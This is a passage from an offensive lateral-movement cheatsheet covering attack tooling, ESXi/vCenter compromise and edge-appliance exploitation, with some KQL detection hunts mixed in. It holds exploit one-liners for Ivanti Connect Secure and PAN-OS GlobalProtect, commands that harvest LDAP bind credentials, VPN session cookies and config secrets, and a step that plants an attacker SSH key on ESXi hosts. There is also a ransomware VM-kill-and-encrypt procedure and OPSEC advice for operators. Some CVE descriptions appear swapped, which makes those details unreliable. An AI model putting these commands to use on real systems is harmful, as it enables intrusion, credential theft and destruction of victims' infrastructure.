| where datetime_diff('minute', TimeGenerated1, TimeGenerated) between (0 .. 30)
| where Layers has LayerName
| project TimeGenerated, Caller, LayerName, FnName

// AWS — StackSet creation by non-baseline principal
AWSCloudTrail
| where EventName in ("CreateStackSet", "CreateStackInstances")
| where UserIdentityType !in ("AWSService", "Root")
| project TimeGenerated, EventName, UserIdentityUserName,
          SourceIpAddress, RequestParameters

// GCP — anomalous SA impersonation (cross-project)
GCPAuditLogs
| where MethodName == "GenerateAccessToken"
| extend Principal = tostring(parse_json(AuthenticationInfo).principalEmail)
| extend Target = tostring(parse_json(Resource).labels.email_id)
| extend SourceIP = tostring(parse_json(RequestMetadata).callerIp)
| join kind=leftanti (GCPAuditLogs
    | where TimeGenerated between (ago(60d) .. ago(7d))
    | where MethodName == "GenerateAccessToken"
    | extend BaselinePrincipal = tostring(parse_json(AuthenticationInfo).principalEmail)
    | extend BaselineTarget = tostring(parse_json(Resource).labels.email_id)
    | distinct BaselinePrincipal, BaselineTarget)
    on $left.Principal == $right.BaselinePrincipal, $left.Target == $right.BaselineTarget
| project TimeGenerated, Principal, Target, SourceIP, MethodName

// Cross-cloud federation — Workload Identity Federation token request
// from external (non-cluster) source
GCPAuditLogs
| where MethodName == "GenerateAccessToken"
| extend AuthMethod = tostring(parse_json(AuthenticationInfo).serviceAccountKeyName)
| where AuthMethod has "workloadIdentityPools"
| extend ExternalIdentity = tostring(parse_json(AuthenticationInfo).principalSubject)
| project TimeGenerated, ExternalIdentity, ServiceAccount = Resource,
          MethodName

// Azure cross-subscription resource-provider call (lateral)
AzureActivity
| where OperationNameValue startswith "Microsoft.Resources"
| extend Caller = tostring(Caller)
| join kind=leftanti (AzureActivity
    | where TimeGenerated between (ago(60d) .. ago(7d))
    | distinct Caller, SubscriptionId, ResourceGroup)
    on Caller, SubscriptionId
| project TimeGenerated, Caller, SubscriptionId, ResourceGroup,
          OperationNameValue
```

---

## 15 — TOOL QUICK REFERENCE (MAINTENANCE STATUS)

> **Legend:** ✅ Active (commits within 6 months) — ⚠ Stalled (6–18 months silent) — ❌ Dead (>18 months silent or archived) — $ Paid / commercial — ◆ Living-off-the-land binary (signed by vendor)

```
═══════════════════════════════════════════════════════════
WINDOWS — REMOTE EXECUTION
═══════════════════════════════════════════════════════════
✅ Impacket suite          https://github.com/fortra/impacket
   psexec / wmiexec / smbexec / atexec / dcomexec — see §2.9
   forensic fingerprint subsection for OPSEC reality
✅ Evil-WinRM             https://github.com/Hackplayers/evil-winrm
   WinRM shell with upload/download (Ruby)
✅ NetExec (nxc)          https://github.com/Pennyw0rth/NetExec
   CrackMapExec successor; mass execution + enumeration
✅ SharpExec              https://github.com/anthemtotheego/SharpExec
   Native C# Impacket alternative — no python.exe footprint
✅ SharpWMI               https://github.com/GhostPack/SharpWMI
   In-line C# WMI execution (Ghostpack)
✅ SharpRDP               https://github.com/0xthirteen/SharpRDP
   Programmatic RDP execution
✅ SCShell                https://github.com/Mr-Un1k0d3r/SCShell
   Fileless SCM lateral movement
✅ SharpSCCM              https://github.com/Mayyhem/SharpSCCM
   SCCM offensive toolkit
✅ Misconfiguration Manager https://github.com/subat0mik/Misconfiguration-Manager
   SCCM attack/defend methodology — SpecterOps
◆ PsExec (Sysinternals)   Native Windows; signed by Microsoft
✅ PyRDP                  https://github.com/GoSecure/pyrdp
   RDP MITM / capture / replay — GoSecure-maintained
✅ CMLoot                 https://github.com/1njected/CMLoot
   SCCM Distribution Point credential harvest

═══════════════════════════════════════════════════════════
WINDOWS — CREDENTIAL MATERIAL / KERBEROS
═══════════════════════════════════════════════════════════
✅ Mimikatz               https://github.com/gentilkiwi/mimikatz
   PTH/PTT/PTC, token manipulation, DPAPI; signature-flagged everywhere
✅ Rubeus                 https://github.com/GhostPack/Rubeus
   Kerberos: asktgt, ptt, dump, S4U, golden/silver, monitor
✅ Certipy                https://github.com/ly4k/Certipy
   ADCS attacks + PKINIT auth; Oliver Lyak-maintained
✅ Certify                https://github.com/GhostPack/Certify
   ADCS abuse from Windows context (Ghostpack)
✅ pywhisker              https://github.com/ShutdownRepo/pywhisker
   Shadow Credentials via msDS-KeyCredentialLink
✅ Whisker                https://github.com/eladshamir/Whisker
   Shadow Credentials from Windows
✅ SharpDPAPI             https://github.com/GhostPack/SharpDPAPI
   DPAPI offline decryption (Ghostpack)
✅ DonPAPI                https://github.com/login-securite/DonPAPI
   Domain-wide DPAPI harvesting
✅ ROADtools              https://github.com/dirkjanm/ROADtools
   Entra ID enumeration + PRT/refresh token attacks
✅ AADInternals           https://github.com/Gerenios/AADInternals
   Hybrid identity / Entra Connect Swiss-army knife
✅ TokenTactics V2        https://github.com/f-bader/TokenTacticsV2
   PRT / refresh-token attack framework
✅ GraphRunner            https://github.com/dafthack/GraphRunner
   Microsoft Graph post-cred attack tool
✅ GraphSpy               https://github.com/RedByte1337/GraphSpy
   Browser-based Graph attack UI
✅ TokenSmith             https://github.com/JumpsecLabs/TokenSmith
   Token storage + replay framework

═══════════════════════════════════════════════════════════
NTLM RELAY / COERCION
═══════════════════════════════════════════════════════════
✅ ntlmrelayx (Impacket)  Multi-protocol relay
✅ PetitPotam             https://github.com/topotam/PetitPotam
   MS-EFSRPC coercion
✅ Coercer                https://github.com/p0dalirius/Coercer
   Multi-protocol coercion framework
✅ DFSCoerce              https://github.com/Wh04m1001/DFSCoerce
   MS-DFSNM coercion
✅ PrinterBug / SpoolSample https://github.com/leechristensen/SpoolSample
   MS-RPRN coercion
✅ KrbRelayUp             https://github.com/Dec0ne/KrbRelayUp
   Kerberos relay → local privesc on AD-joined hosts

═══════════════════════════════════════════════════════════
C2 FRAMEWORKS WITH NATIVE PIVOTING
═══════════════════════════════════════════════════════════
$ Cobalt Strike            socks command + Malleable C2 profiles
✅ Sliver                  https://github.com/BishopFox/sliver
   socks5 start, port-forward; mTLS / WireGuard / DNS / HTTPS
✅ Havoc                   https://github.com/HavocFramework/Havoc
   socks add, demon-tunneled SOCKS5
✅ Mythic                  https://github.com/its-a-feature/Mythic
   Multi-agent framework, socks per agent (Apollo / Athena / Apfell)
$ Outflank Stage 1         Beacon-tunneled SOCKS + custom uTLS
✅ Mythic-Apollo (.NET)    Mythic-native .NET agent (top current pick)

═══════════════════════════════════════════════════════════
TUNNELING & PIVOTING
═══════════════════════════════════════════════════════════
✅ Chisel                 https://github.com/jpillora/chisel
   Fast TCP/UDP tunnel — JA3/JA4 fingerprint detectable
✅ Ligolo-ng              https://github.com/nicocha30/ligolo-ng
   TUN-based pivoting — JA3/JA4 fingerprint detectable
✅ cloudflared            https://github.com/cloudflare/cloudflared
   Cloudflare Tunnel — abuse legitimate service for C2
✅ Tailscale              Mesh VPN — abuse for lateral mesh
✅ ngrok                   TCP exposure via legitimate service
✅ sshuttle               https://github.com/sshuttle/sshuttle
   VPN over SSH (transparent routing)
✅ dnstt                   https://github.com/davidfifield/dnstt
   DoH-based DNS tunneling — David Fifield maintained
✅ Proxychains-ng         https://github.com/rofl0r/proxychains-ng
   Route tools through SOCKS/HTTP proxies
✅ WireGuard               https://www.wireguard.com
   Kernel-mode tunneling

═══════════════════════════════════════════════════════════
ESXi / VMware
═══════════════════════════════════════════════════════════
✅ govc                   https://github.com/vmware/govmomi/tree/main/govc
   VMware-published vSphere CLI; legitimate-tool lateral primitive
✅ pyvmomi                https://github.com/vmware/pyvmomi
   VMware-published Python SDK
✅ esxi-tools (multi)     Various Akira/Black Basta-style tooling
   ESXi shell helper scripts (operator forks)

═══════════════════════════════════════════════════════════
EDGE APPLIANCE / VEEAM
═══════════════════════════════════════════════════════════
✅ veeam-creds            https://github.com/sadshade/veeam-creds
   Veeam B&R stored-credential decryption
✅ NetScalerExploitKit    Various — CVE-2023-4966 SessionPersistAuth
   cookie theft tooling
✅ Ivanti CS exploit chain Various — CVE-2024-21887 / -46805 / -22024

═══════════════════════════════════════════════════════════
DEAD / DEPRECATED — DO NOT RELY ON IN 2026
═══════════════════════════════════════════════════════════
❌ CrackMapExec (cme)               Replaced by NetExec (nxc); repo abandoned 2023
❌ dnscat2                          Last commit ~2018; use dnstt
❌ iodine                           Last commit ~2017; use dnstt
❌ rpivot                           Last commit ~2017; use Chisel/Ligolo
❌ pwd_extractor (legacy Veeam)    Use sadshade/veeam-creds
❌ Stormspotter                     Microsoft archived; use ROADtools / AzureHound
❌ ScoutSuite (orig)                Forks active; original maintenance lapsed
❌ MimiPenguin (Linux LSASS)        Kernel-side mitigations make obsolete
❌ Powerless RDP MITM (legacy)     Use PyRDP

═══════════════════════════════════════════════════════════
METHODOLOGY REFERENCES
═══════════════════════════════════════════════════════════
  MITRE ATT&CK TA0008         https://attack.mitre.org/tactics/TA0008/
  HackTricks                  https://book.hacktricks.wiki/
  The Hacker Recipes          https://www.thehacker.recipes/
  Misconfiguration Manager    https://github.com/subat0mik/Misconfiguration-Manager
  CISA AA22-277A / AA24-038A  Impacket-related joint advisories
  CISA AA23-320A              Scattered Spider TTP advisory
  Microsoft Secure Future     SMB / LDAP signing default changes
    Initiative documentation
  Wiz IngressNightmare        https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  Synacktiv LinkPro (Oct 2025) https://www.synacktiv.com/publications/linkpro-an-ebpf-rootkit-in-the-wild
```

---

## 16 — VMware ESXi / vCenter LATERAL MOVEMENT

> **Why this section exists:** The dominant 2024-2025 ransomware lateral plane. Akira, Black Basta, Hunters International, Inc Ransom, ESXiArgs, Royal, BlackSuit — the entire current-generation ransomware ecosystem targets ESXi after AD foothold. Time-from-foothold-to-all-VMs-encrypted is frequently sub-24h.

### 16.1 — vCenter API abuse + SSO compromise (T1199 + T1078)

```bash
# ════════════════════════════════════════════════════════════
# vCENTER SSO COMPROMISE — primary lateral chain
# MITRE ATT&CK: T1199 (Trusted Relationship) + T1078 (Valid Accounts)
# STEALTH: MEDIUM (vCenter activity expected) | SUCCESS: HIGH
# ════════════════════════════════════════════════════════════

# IDENTIFICATION:
# - Default vCenter admin: administrator@vsphere.local
# - SSO domain: vsphere.local (default; orgs frequently leave default)
# - Common ports: 443 (HTTPS UI/API), 902 (ESXi-vCenter heartbeat),
#   5480 (VAMI), 9087 (lookup service)
# - Hostname pattern: VC-*, VCSA-*, VCENTER-*

# DISCOVER vCenter from AD foothold:
nxc smb 10.0.0.0/24 -u user -p pass --shares | grep -i vmware
nslookup vsphere.local
# SPN scan:
setspn -T target.local -Q vmware/*
# vCenter often has VMWARE/* SPNs registered

# AD-INTEGRATED SSO (most common in mature orgs):
# vCenter joined to AD; "Identity Provider" set to AD/Entra ID.
# Compromise of any AD admin → vCenter login as DA-equivalent if
# vCenter "Administrators" group includes the AD group.
# Check group membership via vSphere API:
curl -k -u "DOMAIN\\admin:pass" \
  -X POST "https://VC/api/session"
# Returns session token; then enumerate:
curl -k -H "vmware-api-session-id: $TOKEN" \
  "https://VC/api/vcenter/cluster"

# vCENTER CVE CHAIN (when SSO compromise unavailable):
# CVE-2023-34048 (vCenter DCERPC OOB write, Oct 2023, CVSS 9.8)
#   - Pre-auth RCE on vCenter Server Appliance via DCERPC port 2012
#   - Patched Oct 2023; broadly used by APT through 2024 (UNC3886
#     campaign — Mandiant June 2024 reported pre-disclosure exploitation
#     dating back to 2021)
#   - Source: https://www.broadcom.com/support/security-center/securityadvisories
# CVE-2024-37079 / -37080 / -37081 (vCenter DCERPC chain, June 2024)
#   - Companion CVE cluster on same DCERPC subsystem
#   - Mass-exploitation observed within weeks of patch

# OPERATOR PATTERN (post-foothold):
# 1. Identify vCenter (above)
# 2. Try AD admin creds first (zero-additional-noise path)
# 3. If failed: check vCenter version → match against unpatched CVE chain
# 4. Once authenticated:
#    a. Enumerate hosts: curl -H ... "https://VC/api/vcenter/host"
#    b. Enumerate VMs: curl -H ... "https://VC/api/vcenter/vm"
#    c. Enable ESXi shell on every host (see §16.2)
#    d. Push payload to all VMs OR encrypt all .vmdk files (see §16.5)

# DETECTION: vCenter audit log surfaces UI logins; vSphere alarms
#   trigger on "Host SSH/shell enabled" actions; MDE / MDI do NOT
#   monitor vCenter directly — needs vendor-specific logging
#   (Aria Operations, custom syslog → SIEM).
# OPSEC RATING: HIGH on AD-SSO path (looks like admin activity);
#   MEDIUM on CVE-exploit path (DCERPC artifacts in network telemetry).
```

### 16.2 — ESXi shell + ESXi local user lateral

```bash
# ════════════════════════════════════════════════════════════
# ESXi LOCAL ROOT ACCESS — once vCenter compromised
# MITRE ATT&CK: T1078 (Valid Accounts) + T1059 (Command Interpreter)
# ════════════════════════════════════════════════════════════

# Enable SSH on all ESXi hosts via vSphere API:
curl -k -X POST -H "vmware-api-session-id: $TOKEN" \
  "https://VC/api/vcenter/host/HOST-MOID/services/TSM-SSH/start"
# OR Power CLI / govc:
govc host.service.enable -name=TSM-SSH HOST
govc host.service.start -name=TSM-SSH HOST

# Add operator SSH key to root@ESXi:
ssh root@ESXi-host "echo 'ssh-ed25519 ATTACKER_KEY' >> /etc/ssh/keys-root/authorized_keys"

# ESXi root password is locally stored (not AD-integrated by default).
# Default password set during install OR Veeam B&R credential store
# (cross-ref §11.6) often holds ESXi root for backup integration.

# ESXi command set (BusyBox-based, Linux-like):
esxcli network vm list                # List VMs by network
esxcli network firewall ruleset list  # ESXi firewall state
vim-cmd vmsvc/getallvms                # Detailed VM list with VMIDs
vim-cmd vmsvc/snapshot.create VMID name desc 1 1
vim-cmd vmsvc/power.off VMID
vim-cmd vmsvc/destroy VMID             # Delete VM
# DATASTORE access:
ls /vmfs/volumes/                      # Datastore mountpoints
ls /vmfs/volumes/datastore1/VMNAME/    # VM directory (.vmdk + .vmx)

# RANSOMWARE PRIMITIVE (operator-relevant for blue-team understanding):
# ESXiArgs / Akira_Linux pattern:
# 1. esxcli vm process list → enumerate running VMs
# 2. esxcli vm process kill --type=force --world-id=<WID> for each
# 3. Encrypt all *.vmdk and *.vmx in /vmfs/volumes/* with chacha20
# 4. Drop ransom note in /etc/motd + /vmfs/volumes/*/RECOVER.txt

# DETECTION: ESXi shell log /var/log/shell.log (rarely shipped to SIEM
#   unless vRealize / Aria Log Insight in use); /var/log/auth.log on
#   ESXi for SSH login events; vCenter "Host configuration changed"
#   alarm on TSM-SSH service start.
# OPSEC RATING: VERY LOW for SSH service start (vCenter alarm fires);
#   but most orgs have alarm noise so high noise tolerance — operator
#   actions rarely escalate to human review until VMs already lost.
```

### 16.3 — VM datastore lateral (VMDK theft / template injection)

```bash
# ════════════════════════════════════════════════════════════
# DATASTORE-LEVEL VM TAMPERING
# MITRE ATT&CK: T1578 (Modify Cloud Compute Infrastructure) +
#               T1556 (Modify Authentication Process)
# ════════════════════════════════════════════════════════════

# As root on ESXi (or via vCenter datastore browser):
# 1. SHUT DOWN target VM (or hot-snapshot for live):
vim-cmd vmsvc/power.suspend VMID
# 2. COPY .vmdk offline → mount on attacker box → modify guest OS
#    filesystem directly (write SSH key to /root/.ssh/authorized_keys
#    in Linux guest; write golden image into Windows guest \Windows\System32)
# 3. POWER ON modified VM → operator now has authenticated access
#    inside the guest as if logged in

# OR: VM TEMPLATE INJECTION
# Compromise a VM template used for new deployments → every newly-
# provisioned VM bootstraps with operator backdoor pre-installed.
govc library.deploy -ds=datastore1 \
  /content-lib/template-name evil-vm

# OPSEC RATING: VERY HIGH — datastore-level changes show in vSphere
#   audit log only at the file-modification timestamp level; rarely
#   actively monitored. Template injection is silent until next
#   provisioning batch.
```

### 16.4 — ESXi-to-ESXi via vSAN / vMotion

```bash
# vSAN: cluster of ESXi hosts share storage. Compromise of one ESXi
# cluster member often = read access to all-cluster datastore.
# vMotion network: typically isolated VLAN, but if reachable from
# operator pivot: vMotion-protocol VM hijack possible (research-grade,
# rare in real engagements).

# MORE COMMON: Enumerate all ESXi hosts in vSAN cluster, repeat §16.2
# on each. Single SSH-key push via vCenter API → all-host root access
# in one operation:
for HOST in $(govc host.info -json | jq -r '.HostSystems[].Name'); do
  govc host.service.start -name=TSM-SSH $HOST
done
```

### 16.5 — Ransomware lateral pattern (operator + blue-team reference)

```
═══════════════════════════════════════════════════════════
TYPICAL RANSOMWARE TIMELINE (Akira / Black Basta / Hunters 2024-2025):
═══════════════════════════════════════════════════════════
T+0:00   Initial access (phishing, edge appliance CVE, AiTM)
T+0:30   AD foothold; BloodHound CE collection
T+2:00   DA equivalent (ADCS ESC, MSOL_*, or Veeam pivot)
T+3:00   Veeam B&R credential extraction → ESXi root + storage admin
T+4:00   vCenter SSO compromise (or direct ESXi root)
T+5:00   SSH enabled on all ESXi hosts via vCenter API
T+6:00   Backup deletion (Veeam / NetApp / Pure snapshot purge)
T+8:00   Encryption begins on all VMs in parallel via ESXi shell
T+12:00  All-VM encryption complete; ransom note dropped
T+24:00  Negotiation begins (or victim discovers via paged on-call)

DEFENSIVE COUNTER-PATTERN:
- Tier 0 isolate vCenter from AD admin reach (separate forest, smartcard-only)
- Veeam server in dedicated tier; immutable backup repos
- vCenter audit → SIEM with high-priority "TSM-SSH service start" rule
- ESXi advanced setting Security.PasswordHistory + Security.AccountLockFailures
- vSphere lockdown mode for non-vCenter ESXi access
═══════════════════════════════════════════════════════════
```

### 16.6 — OPSEC + Detection

```
═══════════════════════════════════════════════════════════
ESXi/vCENTER DETECTION SURFACE
═══════════════════════════════════════════════════════════

vCENTER:
- vpxd.log (vCenter daemon log) — UI / API operations
- Audit events via vSphere Events API
- Aria Operations / Log Insight (paid VMware) consolidates
- CrowdStrike vSphere Integration (Falcon) — recent addition Q4 2024

ESXi:
- /var/log/auth.log — SSH login events
- /var/log/shell.log — ESXi shell command history
- /var/log/hostd.log — host daemon (vSphere agent)
- /var/log/vmkernel.log — kernel-level events
- ESXi syslog forwarding (must be configured) → SIEM

DETECTION GAPS (operator advantage):
- ESXi has no native EDR sensor (limited 3rd-party — Trellix,
  TrendMicro Deep Security have legacy ESXi modules)
- VMware-native security depends on Aria Operations / vSphere Trust
  Authority (vTA), not deployed in most environments
- vSphere alarms have high false-positive noise → operator actions
  often blend with legitimate maintenance

KQL HUNT (Sentinel — vSphere syslog ingestion):
// TSM-SSH service start on multiple ESXi hosts (mass-enable pattern)
Syslog
| where Facility == "vmware" and SyslogMessage has "TSM-SSH"
| where SyslogMessage has "started" or SyslogMessage has "running"
| summarize Hosts = make_set(Computer, 50) by bin(TimeGenerated, 5m)
| where array_length(Hosts) >= 3
| project TimeGenerated, EnabledHostCount = array_length(Hosts), Hosts
```

```
═══════════════════════════════════════════════════════════
SECTION 16 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Cross-ref → §11.6 Veeam pivot (canonical ESXi-credential source)
Cross-ref → §17 Edge appliance lateral (initial access path)
Enables  → All-VM encryption / mass-exfil from datastore
NEVER    → ESXi shell enable on hosts you don't intend to fully
           compromise — TSM-SSH service start is one of the few
           high-fidelity vSphere alarm rules many SOCs actually tune
```

---

## 17 — EDGE APPLIANCE LATERAL MOVEMENT

> **Why this section exists:** Internet-facing VPN/edge appliances became the dominant 2023-2025 nation-state APT initial-access AND lateral pivot. Volt Typhoon, Salt Typhoon, UNC3886, MULTIPLE ransomware affiliates routinely compromise these as the entry point AND maintain persistent foothold from inside them as a Tier 0-adjacent platform.

### 17.1 — Ivanti Connect Secure / Pulse Secure (CVE-2024-21887 chain)

```bash
# ════════════════════════════════════════════════════════════
# IVANTI CS (PULSE SECURE) — VOLT TYPHOON / UNC5221 PATTERN
# CVEs: CVE-2024-21887 (auth bypass), CVE-2023-46805 (cmd injection),
#       CVE-2024-22024 (XXE), CVE-2025-22457 (RCE Apr 2025)
# Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a
# STEALTH: HIGH (appliance traffic blend) | SUCCESS: HIGH on unpatched
# ════════════════════════════════════════════════════════════

# IDENTIFICATION:
# - Hostname: vpn.target.com, sslvpn.*, connect.*, pcs.*
# - HTTP banner: "Pulse Connect Secure" / "Ivanti Connect Secure"
# - Default port: 443 (web SSL VPN)

# EXPLOIT (chain):
curl -k "https://vpn.target.com/api/v1/totp/user-backup-code/../../license/keys-status/;CMD;"
# CMD-injection via path-traversal → execute as root on appliance

# POST-EXPLOIT — what to harvest:
cat /home/runtime/cookies/*              # Active VPN session cookies
cat /etc/passwd                           # Local users (rare interactive)
cat /home/runtime/license-server.txt     # Ivanti license; tenant identifier
# Active Directory bind credentials (LDAP/AD auth backend):
cat /home/runtime/ldap*                   # LDAP bind creds
cat /home/runtime/realms/users/*          # Per-realm config
# UEBA-sensitive: harvest ACTIVE VPN tokens from memory:
ps -ef | grep dsmtm                       # session manager
gcore <PID>; strings core.* | grep -i "session"

# LATERAL FROM INSIDE IVANTI:
# - Operator now sits on Tier 0-adjacent appliance with AD bind creds
# - Pivot inward: ldapsearch with bind creds → AD enumeration
# - Use Ivanti as SOCKS pivot for inward lateral
# - Volt Typhoon pattern: maintain Ivanti foothold for MONTHS as a
#   silent listening post

# DETECTION: Ivanti Integrity Checker Tool (ICT) — Ivanti-published,
#   detects implant artifacts. Mandiant/CISA published IOC packs Q1 2024.
# OPSEC: Volt Typhoon documented bypassing ICT via cron-job hooks +
#   firmware-tier modification. Operator-grade evasion routine.
```

### 17.2 — Palo Alto GlobalProtect (CVE-2024-3400)

```bash
# ════════════════════════════════════════════════════════════
# PAN-OS GLOBALPROTECT — UNAUTHENTICATED COMMAND INJECTION
# CVE-2024-3400 (April 2024, CVSS 10.0)
# Source: https://security.paloaltonetworks.com/CVE-2024-3400
# STEALTH: HIGH on patched-late targets | SUCCESS: HIGH on unpatched
# ════════════════════════════════════════════════════════════

# IDENTIFICATION:
# - HTTPS landing page banner: "GlobalProtect Portal"
# - Default port: 443 (web), 4443 (admin)
# - PAN-OS versions affected: 10.2 (10.2.0-10.2.9-h1), 11.0, 11.1

# EXPLOIT — telemetry-config arbitrary file write:
curl -k "https://gp.target.com/ssl-vpn/hipreport.esp" \
  -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/CMD_INJECTION_HERE"
# Arbitrary file write under telemetry path → executed on next telemetry
# cycle as root on appliance.

# POST-EXPLOIT:
# Harvest XML config DB (contains AD bind creds, RADIUS shared secrets,
# IPSec PSKs, all admin user hashes):
cat /opt/pancfg/mgmt/saved-configs/*.xml | grep -A1 password
cat /opt/pancfg/mgmt/saved-configs/*.xml | grep -A1 -i secret

# LATERAL: with PAN-OS appliance as pivot, operator has L4-L7 visibility
# into all VPN traffic; can intercept VPN sessions for credential
# harvesting or modify firewall rules to allow inward lateral.

# DETECTION: PA published IOC pack. Mandiant attributed to UTA0218.
# CISA emergency directive 24-02. Most environments patched within 2
# weeks but the appliances remained backdoored on already-compromised
# orgs through Q3 2024.
```

### 17.3 — Citrix NetScaler ADC / Gateway (CVE-2023-4966 — "CitrixBleed")

```bash
# ════════════════════════════════════════════════════════════
# NETSCALER ADC SESSION TOKEN LEAK ("CitrixBleed")
# CVE-2023-4966 (Oct 2023, CVSS 9.4) + CVE-2024-8534 (Sep 2024)
# Source: https://www.citrix.com/news/announcements/oct-2023/security-advisory.html
# STEALTH: VERY HIGH (no logs on appliance for theft) | SUCCESS: HIGH
# ════════════════════════════════════════════════════════════

# CitrixBleed: pre-auth memory-disclosure that returns session tokens
# from active VPN users (including post-MFA tokens). Operator harvests
# tokens → replays them → authenticated VPN session WITHOUT credentials,
# bypassing all MFA.

# EXPLOIT:
curl -k "https://gateway.target.com/oauth/idp/.well-known/openid-configuration"
# Followed by post-buffer-overflow leak request — public PoCs from
# multiple researchers (assetnote, watchtowr, mandiant). Returns
# hex-encoded session token from response body.

# REPLAY:
# Open Citrix Receiver / browser → set cookie NSC_AAAC = <stolen_token>
# → land in target's Citrix environment as the user, post-MFA, with
# whatever apps + virtual desktops they had access to.

# CANONICAL APT USE: Used heavily by ransomware affiliates Q4 2023 -
# Q1 2024 (LockBit, BlackCat, Royal). Boeing breach attributed to this CVE.

# DETECTION: NetScaler appliance has minimal logging; theft itself is
#   undetectable without TLS inspection of weird response bodies.
#   Replay-side detection requires session-token-reuse-from-new-IP rule.
# OPSEC RATING: VERY HIGH for theft phase; MEDIUM-HIGH for replay
#   if defender has Citrix Director or SIEM correlation.
```

### 17.4 — Cisco ASA / Firepower

```bash
# ════════════════════════════════════════════════════════════
# CISCO ASA / FIREPOWER — ARCANEDOOR / UAT4356 PATTERN
# CVE-2024-20353 + CVE-2024-20359 (April 2024 — ArcaneDoor)
# CVE-2024-20481 (Oct 2024 — VPN brute-force enabler)
# Source: https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/
# STEALTH: VERY HIGH (multi-month dwell observed) | SUCCESS: requires unpatched ASA
# ════════════════════════════════════════════════════════════

# IDENTIFICATION:
# - Banner / cert CN: "Cisco ASA" / "Cisco Firepower Threat Defense"
# - Default ports: 443 (SSL VPN web), 22/SSH (mgmt), 161/SNMP

# ARCANEDOOR: APT-attributed implants (LINE DANCER, LINE RUNNER) on
# ASA — multi-month dwell, persistent across firmware updates.

# EXPLOIT (CVE-2024-20353 / -20359):
# Service-Web user-defined-redirect path → memory disclosure → RCE
# Exact PoCs not public; APT-grade.

# POST-EXPLOIT:
# - Lua scripting interface on ASA enables persistent in-memory tooling
#   without disk artifact (LINE DANCER pattern)
# - VPN session credential interception
# - Firewall rule modification for inward lateral
# - SNMP credential harvest → broader network management lateral

# DETECTION: Cisco published IOC pack; firmware integrity check via
#   Cisco Talos signed-firmware verification. Without dedicated
#   monitoring, detection is essentially infeasible — this is why
#   Volt Typhoon / UAT4356 retained access for months.
```

### 17.5 — F5 BIG-IP iControl REST

```bash
# ════════════════════════════════════════════════════════════
# F5 BIG-IP — RECURRING ROOT-ACCESS CVE FAMILY
# CVE-2023-46747 (Oct 2023), CVE-2024-39778 (Sep 2024), more
# STEALTH: HIGH | SUCCESS: HIGH on unpatched | SKILL: MED
# ════════════════════════════════════════════════════════════

# F5 BIG-IP routinely produces pre-auth root RCE CVEs in iControl REST
# administrative interface. Operator pattern:
# 1. Identify F5 (banner, default ports 443 mgmt, 8443 alt)
# 2. Match version against current CVE
# 3. Exploit → root on appliance
# 4. Harvest LTM config (load-balancer rules, SSL cert private keys
#    for inspection of internal HTTPS traffic, API gateway secrets)
# 5. F5 as TLS-decryption pivot for inward lateral

# ENUMERATION:
curl -k -u admin:admin "https://f5.target.com/mgmt/tm/sys/version"

# DETECTION: F5 audit logs surface admin actions; TMOS-version
# fingerprint exposes patch state externally. Some orgs run F5
# Advanced WAF self-monitoring but custom CVE detection rare.
```

### 17.6 — OPSEC + Detection for edge appliances

```
═══════════════════════════════════════════════════════════
EDGE APPLIANCE DETECTION REALITY
═══════════════════════════════════════════════════════════

WHY APPLIANCES ARE HIGH-VALUE LATERAL PIVOTS:
- Trusted L3-L7 position (often allowed everywhere)
- Limited or no EDR sensor (vendor restrictions)
- Logging often minimal or vendor-proprietary
- Patching cycles slower than general fleet
- Decryption capability (TLS, VPN) for downstream traffic inspection
- Often domain-joined OR holding AD bind credentials

GENERAL DEFENDER STRATEGIES:
- Vendor-provided integrity checker tools (Ivanti ICT, Cisco Trust
  Anchor verification, F5 secure-vault check)
- Network telemetry: Zeek / Suricata / Corelight watching
  appliance management traffic for anomalous outbound
- Out-of-band syslog forwarding from appliances to SIEM (often
  the only forensic record)
- Hardware-attestation (Cisco Trust Anchor module) for firmware
  integrity verification

ENGAGEMENT-LEVEL OPERATOR REALITY:
- Edge appliances are the modern Tier 0-adjacent platform
- Volt Typhoon / Salt Typhoon dwell-time on appliances measured in
  MONTHS (Mandiant M-Trends 2024-2025 reporting)
- After foothold inside appliance, lateral targets are unconstrained
  by perimeter — operator IS the perimeter
```

```
═══════════════════════════════════════════════════════════
SECTION 17 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables  → §16 ESXi pivot (after AD foothold from appliance)
Enables  → §11.6 Veeam pivot (after AD foothold)
Cross-ref → Initial Access cheatsheet §3.10 (edge-appliance CVE
            initial-access framing)
Cross-ref → Persistence cheatsheet §15 (firmware-tier persistence)
NEVER    → Appliance shell exit without patching the operator's
           own access path; appliance reboots are silent and
           operator gets locked out
```

---

## 18 — DEFENDER STACK REFERENCE (lateral movement)

```
═══════════════════════════════════════════════════════════
WHAT EACH DEFENDER PRODUCT SEES (LATERAL MOVEMENT)
═══════════════════════════════════════════════════════════

WINDOWS ENDPOINT (EDR):
  Microsoft Defender for Endpoint (MDE)
    Sees: process tree (wmiprvse → cmd, mmc → cmd, svchost → cmd),
    LSASS access events, named-pipe creation, registry modification
    on service ImagePath, scheduled-task creation, NTLM auth events,
    WinRM session establishment, RDP session events, RMM agent
    process creation
    Key alerts: "Suspicious lateral movement" family,
    "Pass-the-Hash" (when AES-only forest baseline broken),
    "Suspected DCSync"
  CrowdStrike Falcon
    Same primitives via Falcon sensor; Storyline causal-graph
    reconstruction; OverWatch managed hunting
  SentinelOne Singularity
    Storyline-based reconstruction; ActiveEDR auto-containment
    on confirmed lateral patterns
  Elastic Defend / Carbon Black
    Process / network / file events; Elastic SIEM cross-host correlation

LINUX ENDPOINT (EDR):
  MDE for Linux / Falcon Linux / S1 Linux / Elastic
    auditd integration (legacy) + eBPF sensor (modern)
    Sees: SSH login events, sudo escalation, process exec with UID
    change, container exec into pod, kubectl process invocation
  Falco / Tetragon / Tracee
    eBPF-native runtime detection; rule library for SSH/container/
    K8s lateral patterns (default ruleset catches the obvious cases)

IDENTITY:
  Microsoft Defender for Identity (MDI)
    DC-side sensor; sees: LDAP queries, Kerberos TGS-REQ/TGT-REQ,
    NTLM auth, replication GUIDs (DCSync detection), Pass-the-Ticket
    encryption-type anomalies, Shadow Credentials writes
    Key alerts: "Suspected DCSync", "Suspected Golden Ticket",
    "Suspected Pass-the-Ticket", "Suspected NTLM relay attack",
